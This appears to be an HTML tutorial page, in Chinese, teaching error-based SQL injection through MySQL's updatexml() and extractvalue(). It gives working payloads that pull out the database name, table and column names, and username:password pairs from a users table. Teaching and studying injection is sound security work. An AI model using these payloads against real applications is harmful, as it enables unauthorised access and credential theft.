@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL报错注入知识</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+
+        header {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 2em 0;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 2.5em;
+        }
+
+        nav {
+            background-color: #34495e;
+            color: white;
+        }
+
+        nav ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        nav ul li {
+            padding: 1em;
+        }
+
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+        }
+
+        main {
+            max-width: 800px;
+            margin: 2em auto;
+            padding: 0 1em;
+        }
+
+        section {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 2em;
+            padding: 2em;
+        }
+
+        h2 {
+            color: #2c3e50;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 0.5em;
+            margin-bottom: 1em;
+        }
+
+        pre {
+            background-color: #ecf0f1;
+            padding: 1em;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        footer {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 1em 0;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>SQL报错注入知识分享</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="index.html">返回学习页面</a></li>
+            <li><a href="#error-based">报错注入</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <!-- 报错注入内容 -->
+        <section id="error-based">
+            <h2>报错注入技术</h2>
+            <p>报错注入利用数据库函数执行错误时返回的信息泄露数据，常见函数有 <strong>extractvalue()</strong> 和 <strong>updatexml()</strong>。</p>
+
+            <article>
+                <h3>报错注入原理</h3>
+                <p>利用数据库函数执行错误时返回的信息泄露数据，常见函数：</p>
+                <ul>
+                    <li><code>extractvalue()</code>：需要两个值，是 XML 解析函数，通过非法 XPath 表达式触发错误。</li>
+                    <li><code>updatexml()</code>：需要三个值，是 XML 更新函数，类似 extractvalue。</li>
+                </ul>
+            </article>
+
+            <article>
+                <h3>获取数据库</h3>
+                <pre><code>-- 获取数据库
+select * from users where id='1' and updatexml(1,concat(0x7e,(select database())),1)-- '</code></pre>
+            </article>
+
+            <article>
+                <h3>获取第一个表</h3>
+                <pre><code>-- 获取第一个表
+select * from users where id='1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1) -- '</code></pre>
+            </article>
+
+            <article>
+                <h3>获取第一列</h3>
+                <pre><code>-- 获取第一列
+select * from users where id='1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)),1) -- '</code></pre>
+            </article>
+
+            <article>
+                <h3>获取数据</h3>
+                <pre><code>-- 获取数据
+select * from users where id='1' and updatexml(1,concat(0x7e,(select group_concat(username,":",password) from users limit 0,1)),1)
+
+-- 一点点获取所有数据,修改substr的第二个值就可以
+select * from users where id='1' and updatexml(1,concat(0x7e,substr((select group_concat(username,":",password) from users),1,32)),1) -- '</code></pre>
+            </article>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2025 网络安全知识分享</p>
+    </footer>
+</body>
+
+</html>    
